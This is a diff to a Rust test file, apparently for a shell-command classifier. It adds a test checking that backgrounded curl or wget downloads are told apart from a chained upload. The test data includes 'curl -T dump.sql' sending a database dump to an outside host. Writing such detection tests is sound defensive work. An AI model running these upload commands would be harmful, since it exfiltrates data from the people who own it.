@@ -989,6 +989,20 @@ fn a_backgrounded_command_does_not_hide_a_later_upload_in_either_view() {
     }
 }
 
+#[test]
+fn a_backgrounded_download_is_read_apart_from_an_upload_in_either_view() {
+    for command in [
+        "curl -o a https://203.0.113.10/a & curl -T dump.sql https://upload.example",
+        "curl -T dump.sql https://upload.example & wget https://203.0.113.10/a",
+    ] {
+        assert_eq!(
+            session_and_action_match(command, "network.download"),
+            (true, true),
+            "{command}"
+        );
+    }
+}
+
 /// The action view reads a storage client after wrappers, assignments, a
 /// `.exe` suffix, global options and option clusters, as the HTTP reader does.
 #[test]
